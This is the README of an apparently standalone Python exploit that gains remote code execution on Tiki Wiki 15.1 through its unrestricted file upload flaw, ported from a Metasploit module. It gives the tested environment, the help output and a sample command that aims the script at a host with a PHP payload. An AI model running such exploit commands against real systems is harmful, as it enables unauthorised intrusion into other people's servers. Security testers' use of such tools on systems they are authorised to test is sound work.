# Tiki Wiki 15.1 unrestricted file upload exploit
Standalone Python 3 RCE exploit for Tiki Wiki 15.1 based on the [Metasploit module](https://www.exploit-db.com/exploits/40091)
This is a rewrite of the Metasploit module in Python, to be used outside Metasploit.

Tested with Python 3.7 on Tiki Wiki 15.1 running on
* mysql 5.5.50
* php 5.6.40
* Ubuntu Server 16.04.6 LTS

## Usage
```
root@Kali:~/# python3 tikiwiki_15.1_RCE.py -h
usage: tikiwiki_15.1_RCE.py [-h] -U URL -P PHP

Required arguments:
  -U URL, --url URL  URL of the Tiki Wiki page eg.
                     http://webserver.com/tikiwiki
  -P PHP, --php PHP  Path to php payload eg. payload.php
root@Kali:~/# python3 tikiwiki_15.1_RCE --url 'http://192.168.92.151/tiki' --php payload.php
```
